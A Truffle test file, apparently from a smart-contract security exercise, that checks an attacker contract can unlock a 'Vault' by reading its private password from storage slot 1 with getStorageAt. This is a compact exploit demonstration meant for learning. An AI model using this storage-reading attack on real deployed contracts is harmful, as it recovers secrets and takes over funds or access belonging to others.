const Vault = artifacts.require("Vault");
const VaultHack = artifacts.require("VaultHack");

contract("Vault", async (accounts) => {
    let vault;
    let vaultHack;

    before(async () => {
        vault = await Vault.deployed();
        vaultHack = await VaultHack.deployed();
    });
    
    it("victim should start locked", async () => {
        let isLocked = await vault.locked.call();
        assert.equal(isLocked, true, "victim did not start locked");
    });

    it("attacker should be able to unlock victim", async () => {
        let dataSlot = await web3.eth.getStorageAt(Vault.address, 1)
        await vaultHack.attack(dataSlot);

        let isLocked = await vault.locked.call();
        assert.equal(isLocked, false, "attacker did not unlock victim");
    });
});